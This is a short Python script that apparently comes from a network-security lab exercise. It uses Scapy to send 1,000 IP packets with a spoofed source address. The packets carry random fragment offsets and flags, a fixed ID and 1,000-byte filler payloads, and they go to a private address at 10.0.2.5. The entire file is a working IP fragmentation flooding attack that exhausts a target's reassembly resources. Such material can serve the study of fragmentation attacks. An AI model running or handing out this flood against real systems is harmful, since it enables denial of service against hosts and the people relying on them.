from scapy.all import *
from random import randint
# Construct IP header
for i in range (1000):
    rdm_frag=randint(1,50000)
    rdm_flag=randint(0,1)
    payload='A'*1000
    ip=IP(src="1.2.3.4", dst="10.0.2.5",id=1000,frag=rdm_frag,flags=rdm_flag,)
    pkt=ip/payload
    send(pkt,verbose=0)

print ('send end')





